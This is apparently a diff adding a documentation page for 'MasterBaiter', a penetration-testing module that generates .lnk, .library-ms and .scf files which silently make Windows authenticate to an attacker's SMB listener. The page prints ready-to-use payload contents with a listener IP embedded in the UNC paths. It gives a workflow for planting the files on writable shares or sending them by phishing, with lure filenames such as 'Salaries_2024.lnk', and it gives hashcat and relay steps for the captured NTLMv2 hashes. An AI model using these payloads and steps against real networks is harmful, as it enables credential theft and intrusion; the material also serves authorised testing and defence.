@@ -1,0 +1,144 @@
+---
+title: MasterBaiter
+description: Generate malicious payload files (.lnk, .library-ms, .scf) that automatically trigger Windows NTLM authentication when viewed, capturing NTLMv2 hashes without user interaction.
+---
+
+MasterBaiter generates Windows payload files that exploit automatic UNC path resolution. When a victim's machine browses a folder or renders a file containing one of these payloads, Windows automatically attempts to authenticate to the embedded SMB path — leaking the user's NTLMv2 hash to your Responder listener without any explicit action from the victim.
+
+Navigate to **VULNERABILITIES → MasterBaiter** in the sidebar.
+
+## How it works
+
+All three payload types embed a UNC path pointing to your listener IP (`\\<your_ip>\share\icon.ico`). Windows resolves UNC paths automatically in several contexts:
+
+- **`.library-ms`** — Windows Library files. When a Library file references a remote `simpleLocation` URL pointing to a UNC path, Windows Explorer contacts that path during folder enumeration and renders it as a library location. Authentication is triggered when the Library is loaded.
+- **`.scf`** — Shell Command Files. The `IconFile` directive in an SCF file is resolved by Explorer when the containing folder is opened. No double-click required — simply navigating to the folder triggers authentication.
+- **`.lnk`** — Windows Shortcut files. LNK files embed an `IconPath` and a network target. When Explorer renders the shortcut icon, it contacts the UNC path, triggering authentication.
+
+All three types work because Windows makes the SMB connection to load the icon or resource automatically — before the user opens or executes anything.
+
+## Payload generation
+
+The UI submits to `POST /api/masterbaiter/generate`:
+
+```json
+{
+  "types": ["library", "scf", "lnk"],
+  "file_name": "payload",
+  "ip": "10.10.14.1",
+  "icon_path": "C:\\Windows\\System32\\shell32.dll",
+  "zip": false
+}
+```
+
+| Field | Required | Description |
+|---|---|---|
+| `types` | Yes | Array of payload types to generate. Values: `"library"`, `"scf"`, `"lnk"`. At least one required. |
+| `file_name` | No | Base filename without extension (default: `payload`). |
+| `ip` | Yes | Your listener IP address. Embedded in all UNC paths as `\\<ip>\share\icon.ico`. Auto-filled from the Network Info bar. |
+| `icon_path` | No | Icon path embedded in `.lnk` files (default: `C:\Windows\System32\shell32.dll`). |
+| `zip` | No | When `true`, all generated files are packaged into a single `<file_name>.zip` archive. Individual files are removed from `recon/loads/` after zipping. |
+
+## Generated file formats
+
+### `.library-ms`
+
+A Windows Library XML file with your listener IP embedded in both the `iconReference` and the `simpleLocation` URL:
+
+```xml
+<iconReference>\\10.10.14.1\share\icon.ico</iconReference>
+<searchConnectorDescriptionList>
+  <searchConnectorDescription>
+    <simpleLocation>
+      <url>\\10.10.14.1\shared</url>
+    </simpleLocation>
+  </searchConnectorDescription>
+</searchConnectorDescriptionList>
+```
+
+### `.scf`
+
+A Shell Command File with the icon pointing to your listener:
+
+```ini
+[Shell]
+Command=2
+IconFile=\\10.10.14.1\share\icon.ico
+```
+
+### `.lnk`
+
+A binary Windows Shortcut file constructed in pure Python (no Windows dependency). The LNK header encodes the UNC target `\\<ip>\share\icon.ico` in both the ANSI (`PathBuffer`) and Unicode string fields so Explorer resolves it on any Windows version.
+
+## Output directory and file gallery
+
+All generated files are written to `recon/loads/`. The UI fetches the current file list from `GET /api/masterbaiter/files` and displays it as a downloadable gallery. Each file entry shows the filename and file size.
+
+Download individual files via:
+
+```
+GET /api/masterbaiter/download/<filename>
+```
+
+The download endpoint sanitises the filename with `os.path.basename` to prevent path traversal.
+
+Delete files from the gallery with:
+
+```
+DELETE /api/masterbaiter/delete/<filename>
+```
+
+## Zip packaging
+
+Enable the **Zip** toggle in the UI (or set `"zip": true` in the request) to package all generated files into a single archive named `<file_name>.zip`. Individual files are removed from `recon/loads/` after being added to the zip. This is useful when dropping payloads via email or phishing where a single attachment is more practical.
+
+## Workflow
+
+<Steps>
+  <Step title="Start Responder">
+    Go to **LAYER2 → Responder** and start Responder on the interface connected to the target network. Responder will capture the SMB authentication triggered by the payload files.
+  </Step>
+  <Step title="Configure MasterBaiter">
+    Open **VULNERABILITIES → MasterBaiter**. Confirm your listener IP (auto-filled from Network Info). Enter a descriptive filename. Select the payload types to generate.
+  </Step>
+  <Step title="Generate payload files">
+    Click **Generate**. Files are created in `recon/loads/` and appear in the file gallery below.
+  </Step>
+  <Step title="Download the files">
+    Click each file in the gallery to download it, or enable zip packaging before generating for a single archive.
+  </Step>
+  <Step title="Drop on an accessible share">
+    Place the files in a writable SMB share on the target network — a share that target users are likely to browse. Common candidates: `\\fileserver\documents`, `\\fileserver\shared`, `\\fileserver\public`. Alternatively, send the files via email or a phishing message as attachments.
+  </Step>
+  <Step title="Wait for authentication events">
+    When a victim's machine browses the folder, Windows automatically contacts your listener IP and authenticates. Responder captures the NTLMv2 hash and stores it in the credentials database.
+  </Step>
+  <Step title="Crack or relay the hash">
+    Crack the captured NTLMv2 hash offline:
+
+    ```bash
+    hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
+    ```
+
+    Or relay it with ntlmrelayx to hosts with SMB signing disabled (identified via **NETWORK → SMB Signing Check**).
+  </Step>
+</Steps>
+
+<Tip>
+  Rename the files to something likely to attract user attention — for example, `Salaries_2024.lnk`, `VPN_Instructions.library-ms`, or `ProjectFiles.scf`. The more enticing the filename, the faster a victim browses to it.
+</Tip>
+
+<Warning>
+  Dropping files on shares requires write access to that share. Identify writable shares first using **AD Authenticated → Shares** with the WRITE filter enabled.
+</Warning>
+
+## Output file location
+
+```
+recon/loads/<file_name>.lnk
+recon/loads/<file_name>.library-ms
+recon/loads/<file_name>.scf
+recon/loads/<file_name>.zip    # if zip packaging enabled
+```
+
+Files persist across app restarts and can be regenerated at any time. Delete old payloads from the gallery to keep `recon/loads/` clean between engagements.
